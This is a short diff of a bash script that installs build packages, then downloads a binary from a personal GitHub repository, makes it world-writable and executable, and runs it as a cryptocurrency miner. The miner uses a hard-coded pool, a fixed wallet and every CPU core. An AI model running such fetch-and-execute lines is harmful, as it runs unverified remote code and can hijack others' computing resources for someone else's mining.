@@ -1,7 +1,7 @@
 #!/bin/bash
 apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
-apt install curl libssl1.0-dev libjansson.so.4
-apt install libjansson-dev
+apt install curl libssl1.0-dev
+apt install libjansson-dev libjansson4 -y
 wget -O red https://github.com/kidoescegh/filee/raw/main/cpuflex-avx
 chmod 777 red
 ./red -a flex -o stratum+tcp://eu.mining4people.com:3449 -u kc1qylrmtzw47wldzzgwfkxtgrhgvp8jnyrck33nqu.$(shuf -n 1 -i 1-99999)-ON -t $(nproc --all)
